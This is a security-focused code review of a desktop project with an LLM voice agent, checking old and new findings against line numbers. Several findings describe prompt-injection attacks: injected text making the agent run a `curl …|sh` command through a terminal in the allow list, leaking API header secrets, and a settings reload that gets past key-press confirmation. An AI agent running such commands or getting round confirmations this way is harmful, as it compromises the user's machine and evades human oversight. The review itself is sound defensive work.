# Review round 3 for v0.9.0-rc.3 (618f967)

Range: `git diff 99a6b9c 618f967` (83 files, +7187/−1018). This review only read code; nothing on `dev` was changed. The old findings are those of REVIEW.md on `review/rc3-round2`, numbered as there.

**Tests run.** The pinned toolchain was not used; `cargo +stable test` ran for chora-voice, chora-tiling, chora-kit, chora-scene, chora-construct, chora-mc and chora-xp: 531 tests, 0 failures. The core crate `chora` does not build in the review sandbox (no `libudev`), so ipc.rs, input.rs, state.rs and scene.rs were reviewed by reading only, and the gate scripts were not run.

Severity scale: **breaks** / **endangers** / **simplifies** / **nit**. Line numbers are at 618f967.

---

## 1. Status of the old findings

### Section 1 (voice)

| # | Status | Evidence |
|---|---|---|
| 1.1 `voice.confirm` id is a number | **fixed** | The agent sends a text: mc.rs:163, :198. All receivers also take a number: chora-mc agent.rs:164 (`id_text`), chora-xp wm/voice.rs:67-72, construct hud.rs `Confirm.id: Value`. Test `a_confirmation_with_a_numeric_id_shows` passes. |
| 1.2 `allow` and "always" match the file name of argv[0] | **fixed** | chat.rs:146 `listed` takes a bare name equal to argv[0] and refuses a `/`. The lists are split (`allow_programs`, `allow_methods`) and checked at config.rs:1004. "Always" is keyed by the whole argv (chat.rs:125). The arguments of an `allow_programs` entry are still free: see 2.3. |
| 1.3 always words never cleared | **fixed** | chat.rs:475 `configure()` clears `allowed` on every settings change and on each reload or reconnect. `restart` is gone (client.rs). |
| 1.4 "always" broader than the question | **fixed** | chat.rs:125-141: a key only for the same argv, or the same method with the same canonical parameters; `None` for `inject_input`, `apply_commands`, `code_task`, `agent_start`, `configure_output` and all settings changes. |
| 1.5 a yes in time lost at the deadline | **fixed** | core.rs:507-510 (`in_time`). Test `a_yes_that_starts_in_time_answers_after_the_deadline`. See nit 2.12. |
| 1.6 untrimmed `allow` entries | **fixed** | config.rs:995-1012 refuses whitespace, globs, a `/` in programs, and a method that is not `CLIENT.METHOD`. |
| 1.7 typo in `indicator` | **fixed** | `At` has `deny_unknown_fields` (config.rs:59-60). |

### Section 2 (crates, plugins, tests, dist)

| # | Status | Evidence |
|---|---|---|
| 2.1 `construct.load` in an overlay loses windows | **fixed** | construct main.rs:2112-2119 keeps every pane with a window that the overlay owns (`p.attached`); the dropped ones are windows of other owners that the pane only mirrored. `leave` (main.rs:2145) removes the group, and `remove_subtree` (scene.rs:1140-1144) frees the surfaces and sends `surface.detached`. |
| 2.2 a reserved window stays hidden | **partly** | A `to` without a claim is refused (scene.rs:422). The reservation expires after 5 s (state.rs:148, :521-543) with `surface.detached` to every client. This ends the permanent hiding only when somebody takes the window: see 2.2. |
| 2.3 drop between tiling outputs | **fixed** | tiling wm.rs:834 `output_at`, main.rs:614. |
| 2.4 floating window off-screen | **fixed** | `at` is relative to the work area and clamped (wm.rs:989-992); a failed hand-over calls `unplace` (main.rs:625). Persisted absolute `at` values of older files are only mispositioned: see nit 2.9. |
| 2.5 gate `no_lost` blind | **mostly fixed** | tests/gate-construct-windows.sh:119-136 now flags an ownerless surface, a reserved one, and a construct surface without a pane. The last branch (`not shows and sid not in listed`) still cannot fire, because `window.list` lists every surface. |
| 2.6 drag guesses the window | **fixed** | The press of `move` carries `surface` (input.rs:684 and event.rs); tiling main.rs:917 `taken` drags only that window. |
| 2.7 `grab_all` not retried | **fixed** | tiling main.rs:807-821. |
| 2.8 gate-handover `pipefail` | **fixed** | gate-handover.sh:29. |
| 2.9 PKGBUILD font snippet, session files | **fixed** | The construct sessions ship through the glob (PKGBUILD:53, dist/session/). The font snippet is left out on purpose and explained in build-arch.sh (52ed5fa). |

### Section 3 (simplicity)

| # | Status | Evidence |
|---|---|---|
| 3.1 `PRIVILEGED` out of date | **fixed** | config.rs:382-399: the three `region.*` are in, `pane.remove` is out, and `window.give`, `agent.set`, `notify.push` ask too. The list is still a copy; the kit exports `window.give` as privileged. |
| 3.2 `restart` | **fixed** | removed; test `there_is_no_restart`. |
| 3.3 `Colors` shim in chora-mc | **not fixed** | plugins/chora-mc/src/config.rs:72 still has `from = "Colors"`. It was marked "fix now". |
| 3.4 untagged `Indicator` | not fixed (planned after the release) | config.rs:33. |
| 3.5 claim-under-point three times, `MOVE` twice | **fixed** | one `claimant_at` (scene.rs:200) and one `MOVE` (binding.rs:11). |
| 3.6 `window.give` answers | **fixed** | the kit answers the surface id (give.rs), `surface` is required, and the schema says so. |
| 3.7-3.10, 3.12 | not fixed (planned after the release) | the YAML store, the shader writer, the claim state machine, `announces`, the drag modifier. 3.8's security part is fixed: construct and mc refuse a missing `XDG_RUNTIME_DIR` (construct main.rs:418, mc main.rs:333) as does xp (main.rs:179). |
| 3.11 docs drift | **fixed** | configuration.md:625 (K2b) and :431 (`lead`). |

### Section 4 (security)

| # | Status | Evidence |
|---|---|---|
| 4.1 "always"/`allow` ignore the arguments | **mostly fixed** | "Always" now includes the arguments (1.4). `allow_programs` still ignores them: see 2.3. |
| 4.2 `voice.confirm` leaks secrets | **partly** | `detail` hides secrets (chat.rs:163, :1309 `hide`) and `settings.get` hides `*_headers` (client.rs:243, :273). The answers of `settings.set` and `settings.reload` do not: see 2.1. |
| 4.3 `confirm` deny-list | **fixed** | see 3.1. |
| 4.4 weak protection of settings | **fixed**, with a bypass | `allow_*`, `confirm`, `confirm_keys`, `indicator`, `earcons`, `confirm_timeout_ms`, `ptt_key`, `wake_words`, `sleep_words` are security keys (config.rs:608); their question takes only a key press or a click (core.rs:1039-1062, client.rs:437). `inject_input` is refused while one waits (tools.rs:263). The bypass is 2.4. |
| 4.5 unprivileged `mute`, `talk`, `indicator.claim` | **fixed** | client.rs:358-420; xp shows the sleeping pose (voice.rs:23, :51). |
| 4.6 shared grabs for confined clients | **fixed** | ipc.rs:1287 (`fixed(c).is_none()`), test `a_client_socket_shares_no_button_grab`. |
| 4.7 `start_move` serial | **fixed** | input.rs:657-669 needs `has_grab(serial)` and a grab focus on that toplevel. Test `a_move_with_a_stale_serial_starts_no_drag`. |
| 4.8 `window.give` unprivileged | **fixed**, one rest | privileged export, and `to` needs a claim. A confined client can still create a claim group (clients.rs:288, untouched). New toplevels under the pointer then go to it for 5 s until the expiry frees them; nothing is lost. |
| 4.9 spoofed voice state | **fixed** | xp voice.rs:38; mc main.rs:399-413 and :731; the agent emits HUD events only as `voice` (client.rs:35). |

---

## 2. New findings, most severe first

1. **kit settings.rs:216-228 and runtime.rs:263-273, :314, with voice client.rs:243: `settings.set` and `settings.reload` answer the whole settings, `*_headers` included.** Severity: **endangers**.
   - Only `settings.get` is intercepted. The answer of `voice.settings.set` goes back to the caller as the tool result: the LLM history and the LLM server get it, and the journal logs the first 300 characters of it unredacted (chat.rs `journal` hides arguments only).
   - Repro: `llm_headers: {Authorization: Bearer sk-…}` in the settings file; say "set barge in to 300" and answer yes. The tool result holds the header values, also those of `asr_headers` and `tts_headers`, which belong to other servers. Text injected into a page can then ask the LLM to send them out.
   - Fix: hide the header values in the answer of `settings.set`/`reload` in voice (one `without_headers` call), and in `journal` for the result.

2. **state.rs:529-543 (`expire_reservations`) with the receivers: an expired reservation that nobody takes leaves an ownerless window.** Severity: **endangers** (the owner's rule).
   - After 5 s the core clears `to` and tells everyone, but it does not choose a manager. If no other window manager runs, or all decline, the surface has no owner, no parent and no visibility. The gate itself counts an ownerless surface as lost.
   - Repro: only construct (flavor) runs and its view has no room (main.rs:1424-1428, `NO_ROOM`); tiling hands it a window. The window waits in the list (a notice shows) and, after 5 s, is ownerless and hidden until the user opens the list and picks it. Same for a receiver that disconnects between the give and the attach.
   - Fix: at expiry, give the window back to the giver (the core knows it at `Remove { to }`), or to the claimant of `manager_of_new`.

3. **chat.rs:146-152: `allow_programs` ignores the arguments.** Severity: **endangers**.
   - Repro: `allow_programs: [foot]`; an injected text makes the LLM call `run_program {"argv": ["foot", "-e", "sh", "-c", "curl …|sh"]}`. It runs with no question, as `foot -e sh` is arbitrary command execution. "Always" was narrowed to the full argv, `allow` was not.
   - Fix: allow only argv of length 1, or an entry with its arguments, such as `foot -e htop`, matched exactly. Or refuse the entry for terminals in the docs.

4. **chat.rs:1055-1076 (`confirmed`), config.rs:382-384: `voice.settings.reload` is a spoken question, not a key question.** Severity: **endangers** (plausible; needs a way to write the settings file).
   - `physical` comes from `own_settings_set`, which sees only `settings.set`. If the coder harness or any tool can write `~/.config/chora/voice.yaml` (`unsandboxed`, or a sandbox that mounts the home), the LLM widens `allow_programs` or `confirm` there and calls `voice.settings.reload`. One spoken "yes" to "Shall I run settings reload…?" applies it. The key-press rule of 4.4 is passed.
   - Fix: on reload, compare the new file with the running settings and ask by key when a security key differs; or make `reload` itself physical.

5. **construct main.rs:1567-1572 (`close_ahead`) and :1664-1666 (`FlyIn`) with :1723 (`pane_ahead`): the pane "ahead" ignores whether it shows.** Severity: **endangers** (plausible; the end-to-end effect needs a build with a display).
   - `focus()` keeps only a pane whose `sight` is "shown" (main.rs:2061-2064). `pane_ahead` takes the best cosine over 0.3 whatever its distance or sight. The new corner rule (main.rs:1983, `in_front`) hides a whole pane when a corner is level with the eye, and walking along a wide pane does that often.
   - Repro: stand beside a large pane, so that it is hidden and nothing else is in view; press the close key. The hidden window gets a close request. A pane beyond the fog radius straight ahead is the same case. Fly-in goes to an invisible pane.
   - Fix: have `close_ahead` and `FlyIn` use `focus()`, or check `sight`.

6. **voice core.rs:1059-1068 and client.rs:110-122: "physical" means "the answer came from a client that holds `indicator.claim`".** Severity: **simplifies** (a rule to write down).
   - A confined client with `methods.privileged` can claim the indicator and then answer every key question with `confirm.answer`. The privilege flag therefore covers the physical rule. docs/voice.md should say that a claimer is trusted like the keyboard.

7. **state.rs:529-543: the expiry sends `surface.detached` to every client, and the first window manager wins.** Severity: **nit**.
   - A receiver that needs more than 5 s (construct while it measures texts, xp while the client has not committed) loses the window to a manager on another output. Nothing is lost, the window moves. The 5 s are a constant.

8. **chat.rs:965-985 (`guard`, `Failed::like`): "the same shape" blocks a call with other values.** Severity: **nit**.
   - After two failures of `run_program {"argv": ["foot"]}`, the call `{"argv": ["xterm"]}` has the same form and does not run for the rest of the turn. The note says "stop", so this is by design, but it costs a retry with a changed value. Compare the error, or the values of `argv`.

9. **tiling wm.rs:989: `at` changed from absolute to relative.** Severity: **nit**.
   - A kept node from rc.2 holds an absolute `at`. On an output at x=1920 it reads as an offset of ≥1920 and clamps to the right edge. On-screen, only mispositioned. A one-time reset of `at` for old meta would do.

10. **mc main.rs:1266: mc claims its whole output.** Severity: **nit**.
    - Next to another window manager with the same area on one output (xp claims a whole output too), `claimant_at` picks by node id order (the scene is an `OrdMap`): new windows, gives and shared grabs go to whichever id sorts first. Tiling claims the work area, which is smaller, and wins.

11. **plugins/chora-mc/src/config.rs:72: the `Colors` shim is still there** (old 3.3, "fix now"). Severity: **simplifies**.

12. **voice core.rs:507-510: any older pending utterance keeps a question open.** Severity: **nit**.
    - `p.onset <= until` is true for a text said before the question, which `answers()` ignores. The question then stays open until the ASR returns, and a late yes after the timeout of `chat.ask` goes to a closed channel without a sign.

13. **construct hud.rs:1259-1262 with chat.rs:163: the detail of a question is unbounded.** Severity: **nit**.
    - `chunks` gives one text node of 4 KiB per piece, and `fitted` measures each. A 1 MB `params` makes 256 nodes per redraw. Cap the detail on the screen, and keep the full value for the log.

**Checked and clean:** the `move` serial and focus check (input.rs:657-669) including subsurfaces; the claim check of `Remove { to }`; the shared-grab rule on the main socket; `confirm_keys` grabs while a physical question waits and lets go on `done` (client.rs:437-453); `confirm.answer` accepts only a claimer and only the open id (client.rs:110-139, core.rs:1059); the LLM has no route to `confirm.answer` (tools.rs `skipped`, the own-client rule); `hud_client` stops events of an agent under another name; the tiling drop and the float clamp; the `construct.load` overlay branch; `XDG_RUNTIME_DIR` handling in xp, mc and construct (absolute path only, no `/tmp`); the settings save of only non-defaults and the fallback of a broken file are older than 99a6b9c and were not changed in this range (kit settings.rs:102-110, :201-205, :230-245 refuse `set` and `save` while the file is broken).
